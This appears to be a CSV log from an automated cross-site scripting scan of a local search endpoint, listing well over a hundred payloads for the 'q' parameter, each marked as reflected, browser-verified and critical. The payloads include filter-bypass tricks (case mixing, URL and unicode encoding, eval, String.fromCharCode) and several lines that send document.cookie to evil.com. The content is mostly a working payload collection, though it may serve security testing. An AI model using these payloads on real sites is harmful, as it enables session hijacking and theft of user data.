Payload_Start_Time,Payload_End_Time,Duration_Seconds,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
2026-01-10 14:26:04.188,2026-01-10 14:26:04.192,0.003,http://localhost:3000/search,GET,q,<img src=x onselect=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.192,2026-01-10 14:26:04.196,0.004,http://localhost:3000/search,GET,q,<img src=x onselectionchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.196,2026-01-10 14:26:04.199,0.003,http://localhost:3000/search,GET,q,<img src=x onselectstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.199,2026-01-10 14:26:04.206,0.007,http://localhost:3000/search,GET,q,<img src=x onstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.206,2026-01-10 14:26:04.210,0.004,http://localhost:3000/search,GET,q,<img src=x onstop=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.210,2026-01-10 14:26:04.214,0.004,http://localhost:3000/search,GET,q,<img src=x onsubmit=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.214,2026-01-10 14:26:04.217,0.003,http://localhost:3000/search,GET,q,<img src=x onunload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.217,2026-01-10 14:26:04.224,0.007,http://localhost:3000/search,GET,q,javascript:alert(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.224,2026-01-10 14:26:04.228,0.004,http://localhost:3000/search,GET,q,javascript:alert('XSS'),RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.228,2026-01-10 14:26:04.232,0.004,http://localhost:3000/search,GET,q,javascript:prompt(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.232,2026-01-10 14:26:04.235,0.003,http://localhost:3000/search,GET,q,javascript:confirm(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.235,2026-01-10 14:26:04.244,0.009,http://localhost:3000/search,GET,q,"data:text/html,<script>alert(1)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.244,2026-01-10 14:26:04.248,0.004,http://localhost:3000/search,GET,q,"data:text/html,<img src=x onerror=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.248,2026-01-10 14:26:04.251,0.003,http://localhost:3000/search,GET,q,<q/oncut=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.251,2026-01-10 14:26:04.259,0.008,http://localhost:3000/search,GET,q,<q/onclick=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.259,2026-01-10 14:26:04.263,0.004,http://localhost:3000/search,GET,q,<q/ondrag=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.263,2026-01-10 14:26:04.265,0.003,http://localhost:3000/search,GET,q,<q/ondrop=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.265,2026-01-10 14:26:04.268,0.003,http://localhost:3000/search,GET,q,<q/onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.268,2026-01-10 14:26:04.271,0.003,http://localhost:3000/search,GET,q,<q/onfocus=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.271,2026-01-10 14:26:04.279,0.007,http://localhost:3000/search,GET,q,<q/oninput=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.279,2026-01-10 14:26:04.283,0.004,http://localhost:3000/search,GET,q,<q/onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.283,2026-01-10 14:26:04.286,0.003,http://localhost:3000/search,GET,q,<q/onmove=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.286,2026-01-10 14:26:04.289,0.003,http://localhost:3000/search,GET,q,<q/onpaste=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.289,2026-01-10 14:26:04.297,0.008,http://localhost:3000/search,GET,q,<q/onreset=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.297,2026-01-10 14:26:04.301,0.004,http://localhost:3000/search,GET,q,<q/onresize=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.301,2026-01-10 14:26:04.304,0.003,http://localhost:3000/search,GET,q,<q/onscroll=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.304,2026-01-10 14:26:04.306,0.002,http://localhost:3000/search,GET,q,<q/onselect=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.307,2026-01-10 14:26:04.311,0.004,http://localhost:3000/search,GET,q,<q/onstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.311,2026-01-10 14:26:04.313,0.003,http://localhost:3000/search,GET,q,<q/onstop=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.313,2026-01-10 14:26:04.320,0.007,http://localhost:3000/search,GET,q,<q/onsubmit=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.320,2026-01-10 14:26:04.324,0.004,http://localhost:3000/search,GET,q,<script>alert(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.324,2026-01-10 14:26:04.327,0.003,http://localhost:3000/search,GET,q,<img src=x onerror=alert(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.327,2026-01-10 14:26:04.331,0.004,http://localhost:3000/search,GET,q,<svg onload=alert(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.331,2026-01-10 14:26:04.338,0.007,http://localhost:3000/search,GET,q,<body onload=alert(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.338,2026-01-10 14:26:04.341,0.003,http://localhost:3000/search,GET,q,<script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.341,2026-01-10 14:26:04.345,0.004,http://localhost:3000/search,GET,q,alert(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.345,2026-01-10 14:26:04.348,0.003,http://localhost:3000/search,GET,q,</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.348,2026-01-10 14:26:04.355,0.007,http://localhost:3000/search,GET,q,<img	src=x	onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.355,2026-01-10 14:26:04.359,0.004,http://localhost:3000/search,GET,q,<svg,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.359,2026-01-10 14:26:04.363,0.004,http://localhost:3000/search,GET,q,onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.363,2026-01-10 14:26:04.367,0.004,http://localhost:3000/search,GET,q,<ScRiPt>alert(1)</ScRiPt>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.367,2026-01-10 14:26:04.374,0.007,http://localhost:3000/search,GET,q,<sCrIpT>alert(1)</sCrIpT>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.374,2026-01-10 14:26:04.377,0.003,http://localhost:3000/search,GET,q,<SCRIPT>alert(1)</SCRIPT>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.377,2026-01-10 14:26:04.381,0.004,http://localhost:3000/search,GET,q,<IMG SRC=x ONERROR=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.381,2026-01-10 14:26:04.384,0.003,http://localhost:3000/search,GET,q,<ImG sRc=x OnErRoR=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.384,2026-01-10 14:26:04.393,0.009,http://localhost:3000/search,GET,q,<SVG ONLOAD=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.393,2026-01-10 14:26:04.396,0.003,http://localhost:3000/search,GET,q,<SvG oNlOaD=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.396,2026-01-10 14:26:04.399,0.003,http://localhost:3000/search,GET,q,< script >alert(1)< / script >,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.399,2026-01-10 14:26:04.403,0.004,http://localhost:3000/search,GET,q,< img src=x onerror=alert(1) >,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.403,2026-01-10 14:26:04.406,0.004,http://localhost:3000/search,GET,q,< svg onload=alert(1) >,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.406,2026-01-10 14:26:04.416,0.010,http://localhost:3000/search,GET,q,<scr<script>ipt>alert(1)</scr</script>ipt>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.416,2026-01-10 14:26:04.420,0.004,http://localhost:3000/search,GET,q,<<script>script>alert(1)<</script>/script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.420,2026-01-10 14:26:04.423,0.003,http://localhost:3000/search,GET,q,"<img src=""x""onerror=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.423,2026-01-10 14:26:04.427,0.004,http://localhost:3000/search,GET,q,<svg/onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.427,2026-01-10 14:26:04.430,0.003,http://localhost:3000/search,GET,q,<svg//onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.430,2026-01-10 14:26:04.438,0.008,http://localhost:3000/search,GET,q,%3Cscript%3Ealert(1)%3C/script%3E,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.438,2026-01-10 14:26:04.443,0.004,http://localhost:3000/search,GET,q,%3Cimg%20src=x%20onerror=alert(1)%3E,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.443,2026-01-10 14:26:04.447,0.004,http://localhost:3000/search,GET,q,%3Csvg%20onload=alert(1)%3E,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.447,2026-01-10 14:26:04.456,0.008,http://localhost:3000/search,GET,q,<script>alert`1`</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.456,2026-01-10 14:26:04.461,0.005,http://localhost:3000/search,GET,q,<img src=x onerror=alert`1`>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.461,2026-01-10 14:26:04.465,0.004,http://localhost:3000/search,GET,q,<svg onload=alert`1`>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.465,2026-01-10 14:26:04.473,0.008,http://localhost:3000/search,GET,q,<script>/**/alert(1)/**/</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.473,2026-01-10 14:26:04.477,0.004,http://localhost:3000/search,GET,q,<script><!---->alert(1)<!----></script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.477,2026-01-10 14:26:04.481,0.004,http://localhost:3000/search,GET,q,<img src=x onerror=/**/alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.481,2026-01-10 14:26:04.485,0.004,http://localhost:3000/search,GET,q,<script>eval('alert(1)')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.485,2026-01-10 14:26:04.494,0.009,http://localhost:3000/search,GET,q,"<script>eval(""alert(1)"")</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.494,2026-01-10 14:26:04.499,0.004,http://localhost:3000/search,GET,q,<script>eval(atob('YWxlcnQoMSk='))</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.499,2026-01-10 14:26:04.502,0.003,http://localhost:3000/search,GET,q,<img src=x onerror=eval('alert(1)')>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.502,2026-01-10 14:26:04.512,0.010,http://localhost:3000/search,GET,q,<svg onload=eval('alert(1)')>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.512,2026-01-10 14:26:04.516,0.004,http://localhost:3000/search,GET,q,<script>Function('alert(1)')()</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.516,2026-01-10 14:26:04.524,0.008,http://localhost:3000/search,GET,q,<script>new Function('alert(1)')()</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.524,2026-01-10 14:26:04.527,0.004,http://localhost:3000/search,GET,q,<img src=x onerror=Function('alert(1)')()>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.527,2026-01-10 14:26:04.532,0.005,http://localhost:3000/search,GET,q,"<script>setTimeout('alert(1)',0)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.532,2026-01-10 14:26:04.540,0.008,http://localhost:3000/search,GET,q,"<script>setTimeout(""alert(1)"",0)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.540,2026-01-10 14:26:04.545,0.004,http://localhost:3000/search,GET,q,"<script>setInterval('alert(1)',0)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.545,2026-01-10 14:26:04.548,0.004,http://localhost:3000/search,GET,q,"<img src=x onerror=setTimeout('alert(1)',0)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.548,2026-01-10 14:26:04.552,0.003,http://localhost:3000/search,GET,q,<script>location='javascript:alert(1)'</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.552,2026-01-10 14:26:04.560,0.008,http://localhost:3000/search,GET,q,<script>location.href='javascript:alert(1)'</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.560,2026-01-10 14:26:04.563,0.003,http://localhost:3000/search,GET,q,"<script>location=String.fromCharCode(106,97,118,97,115,99,114,105,112,116,58,97,108,101,114,116,40,49,41)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.563,2026-01-10 14:26:04.566,0.003,http://localhost:3000/search,GET,q,<script>\u0061lert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.566,2026-01-10 14:26:04.569,0.003,http://localhost:3000/search,GET,q,<script>\u0061\u006C\u0065\u0072\u0074(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.569,2026-01-10 14:26:04.572,0.002,http://localhost:3000/search,GET,q,<img src=x onerror=\u0061lert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.572,2026-01-10 14:26:04.581,0.009,http://localhost:3000/search,GET,q,<script>eval('\x61lert(1)')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.581,2026-01-10 14:26:04.585,0.004,http://localhost:3000/search,GET,q,<script>eval('\x61\x6C\x65\x72\x74\x28\x31\x29')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.585,2026-01-10 14:26:04.588,0.004,http://localhost:3000/search,GET,q,"<script>alert(String.fromCharCode(88,83,83))</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.588,2026-01-10 14:26:04.596,0.008,http://localhost:3000/search,GET,q,"<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.596,2026-01-10 14:26:04.601,0.004,http://localhost:3000/search,GET,q,<script>document.write('<img src=x onerror=alert(1)>')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.601,2026-01-10 14:26:04.604,0.003,http://localhost:3000/search,GET,q,<script>document.write('<svg onload=alert(1)>')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.604,2026-01-10 14:26:04.608,0.004,http://localhost:3000/search,GET,q,<script>document.body.innerHTML='<img src=x onerror=alert(1)>'</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.608,2026-01-10 14:26:04.617,0.009,http://localhost:3000/search,GET,q,<a href=javascript:alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.617,2026-01-10 14:26:04.620,0.003,http://localhost:3000/search,GET,q,"<a href=""javascript:alert(1)"">X</a>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.620,2026-01-10 14:26:04.623,0.004,http://localhost:3000/search,GET,q,<a href='javascript:alert(1)'>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.623,2026-01-10 14:26:04.633,0.010,http://localhost:3000/search,GET,q,<a href=j&#x61vascript:alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.633,2026-01-10 14:26:04.637,0.004,http://localhost:3000/search,GET,q,<a href=j&#97vascript:alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.637,2026-01-10 14:26:04.639,0.003,http://localhost:3000/search,GET,q,<form><button formaction=javascript:alert(1)>X</button></form>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.640,2026-01-10 14:26:04.649,0.009,http://localhost:3000/search,GET,q,<form><input formaction=javascript:alert(1) type=submit value=X></form>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.649,2026-01-10 14:26:04.652,0.004,http://localhost:3000/search,GET,q,<form><input type=submit formaction=javascript:alert(1) value=X></form>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.652,2026-01-10 14:26:04.655,0.003,http://localhost:3000/search,GET,q,<base href=javascript:alert(1)//>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.655,2026-01-10 14:26:04.659,0.004,http://localhost:3000/search,GET,q,"<script>import('data:text/javascript,alert(1)')</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.659,2026-01-10 14:26:04.662,0.003,http://localhost:3000/search,GET,q,"<noscript><p title=""</noscript><img src=x onerror=alert(1)>"">",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.662,2026-01-10 14:26:04.671,0.009,http://localhost:3000/search,GET,q,<div id=x tabindex=1 onactivate=alert(1)></div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.671,2026-01-10 14:26:04.674,0.003,http://localhost:3000/search,GET,q,<div contenteditable onblur=alert(1)>test</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.674,2026-01-10 14:26:04.679,0.004,http://localhost:3000/search,GET,q,<div draggable=true ondrag=alert(1)>test</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.679,2026-01-10 14:26:04.687,0.008,http://localhost:3000/search,GET,q,<svg><animate onbegin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.687,2026-01-10 14:26:04.691,0.004,http://localhost:3000/search,GET,q,<svg><set onbegin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.691,2026-01-10 14:26:04.695,0.003,http://localhost:3000/search,GET,q,<svg><animatemotion onbegin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.695,2026-01-10 14:26:04.703,0.008,http://localhost:3000/search,GET,q,<svg><animatetransform onbegin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.703,2026-01-10 14:26:04.707,0.004,http://localhost:3000/search,GET,q,<svg><discard onbegin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.707,2026-01-10 14:26:04.711,0.004,http://localhost:3000/search,GET,q,<math><maction actiontype=toggle onclick=alert(1)>X</maction></math>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.711,2026-01-10 14:26:04.714,0.004,http://localhost:3000/search,GET,q,"<iframe srcdoc=""<img src=x onerror=alert(1)>""></iframe>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.714,2026-01-10 14:26:04.722,0.007,http://localhost:3000/search,GET,q,"<iframe srcdoc=""<script>alert(1)</script>""></iframe>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.722,2026-01-10 14:26:04.726,0.004,http://localhost:3000/search,GET,q,"<iframe srcdoc=""<svg onload=alert(1)>""></iframe>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.726,2026-01-10 14:26:04.730,0.004,http://localhost:3000/search,GET,q,<img name=alert src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.730,2026-01-10 14:26:04.738,0.008,http://localhost:3000/search,GET,q,<form name=alert><input type=submit onclick=alert(1)></form>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.738,2026-01-10 14:26:04.742,0.004,http://localhost:3000/search,GET,q,<script>alert(document.cookie)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.742,2026-01-10 14:26:04.745,0.003,http://localhost:3000/search,GET,q,<script>fetch('http://evil.com?c='+document.cookie)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.745,2026-01-10 14:26:04.754,0.009,http://localhost:3000/search,GET,q,<img src=x onerror=this.src='http://evil.com?c='+document.cookie>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.754,2026-01-10 14:26:04.757,0.003,http://localhost:3000/search,GET,q,<svg onload=fetch('http://evil.com?c='+document.cookie)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.757,2026-01-10 14:26:04.761,0.004,http://localhost:3000/search,GET,q,<script>document.body.innerHTML+=alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.761,2026-01-10 14:26:04.769,0.008,http://localhost:3000/search,GET,q,<script>document.getElementById('x').innerHTML='<img src=x onerror=alert(1)>'</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.769,2026-01-10 14:26:04.773,0.004,http://localhost:3000/search,GET,q,<body/onhashchange=alert(1)><a href=#x>clickme</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.773,2026-01-10 14:26:04.777,0.004,http://localhost:3000/search,GET,q,<body/onpopstate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.777,2026-01-10 14:26:04.780,0.004,http://localhost:3000/search,GET,q,<body/onpageshow=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.781,2026-01-10 14:26:04.789,0.008,http://localhost:3000/search,GET,q,<body/onpagehide=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.789,2026-01-10 14:26:04.793,0.005,http://localhost:3000/search,GET,q,<body/onstorage=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.793,2026-01-10 14:26:04.797,0.004,http://localhost:3000/search,GET,q,<script>new WebSocket('ws://evil.com').onopen=alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.797,2026-01-10 14:26:04.800,0.003,http://localhost:3000/search,GET,q,<script><![CDATA[alert(1)]]></script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.800,2026-01-10 14:26:04.809,0.009,http://localhost:3000/search,GET,q,"<?xml version=""1.0""?><script>alert(1)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.809,2026-01-10 14:26:04.813,0.004,http://localhost:3000/search,GET,q,"<?xml-stylesheet type=""text/xsl"" href=""javascript:alert(1)""?>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.813,2026-01-10 14:26:04.817,0.004,http://localhost:3000/search,GET,q,﻿<script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.817,2026-01-10 14:26:04.825,0.009,http://localhost:3000/search,GET,q,<source src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.825,2026-01-10 14:26:04.830,0.005,http://localhost:3000/search,GET,q,<track src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.830,2026-01-10 14:26:04.833,0.003,http://localhost:3000/search,GET,q,<image src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.833,2026-01-10 14:26:04.840,0.007,http://localhost:3000/search,GET,q,<use href=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.840,2026-01-10 14:26:04.845,0.004,http://localhost:3000/search,GET,q,<input autofocus onfocus=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.845,2026-01-10 14:26:04.848,0.004,http://localhost:3000/search,GET,q,<textarea autofocus onfocus=alert(1)></textarea>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.848,2026-01-10 14:26:04.857,0.008,http://localhost:3000/search,GET,q,<select autofocus onfocus=alert(1)></select>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.857,2026-01-10 14:26:04.862,0.005,http://localhost:3000/search,GET,q,<button autofocus onfocus=alert(1)>X</button>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.862,2026-01-10 14:26:04.866,0.004,http://localhost:3000/search,GET,q,<div onpointerdown=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.866,2026-01-10 14:26:04.874,0.008,http://localhost:3000/search,GET,q,<div onpointerup=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.874,2026-01-10 14:26:04.880,0.005,http://localhost:3000/search,GET,q,<div onpointerover=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.880,2026-01-10 14:26:04.883,0.003,http://localhost:3000/search,GET,q,<div onpointerenter=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.883,2026-01-10 14:26:04.890,0.007,http://localhost:3000/search,GET,q,<div onpointerleave=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.891,2026-01-10 14:26:04.894,0.004,http://localhost:3000/search,GET,q,<div onpointermove=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.894,2026-01-10 14:26:04.898,0.004,http://localhost:3000/search,GET,q,<div ontouchstart=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.898,2026-01-10 14:26:04.902,0.004,http://localhost:3000/search,GET,q,<div ontouchend=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.902,2026-01-10 14:26:04.909,0.007,http://localhost:3000/search,GET,q,<div ontouchmove=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.909,2026-01-10 14:26:04.912,0.003,http://localhost:3000/search,GET,q,"<div style=""animation:spin 1s"" onanimationstart=alert(1)>X</div>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.912,2026-01-10 14:26:04.916,0.004,http://localhost:3000/search,GET,q,"<div style=""animation:spin 1s"" onanimationend=alert(1)>X</div>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.916,2026-01-10 14:26:04.919,0.003,http://localhost:3000/search,GET,q,"<div style=""animation:spin 1s"" onanimationiteration=alert(1)>X</div>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.919,2026-01-10 14:26:04.922,0.003,http://localhost:3000/search,GET,q,"<div style=""transition:all 1s"" ontransitionend=alert(1)>X</div>",RAW_REFLECTION,Yes,alert,Critical
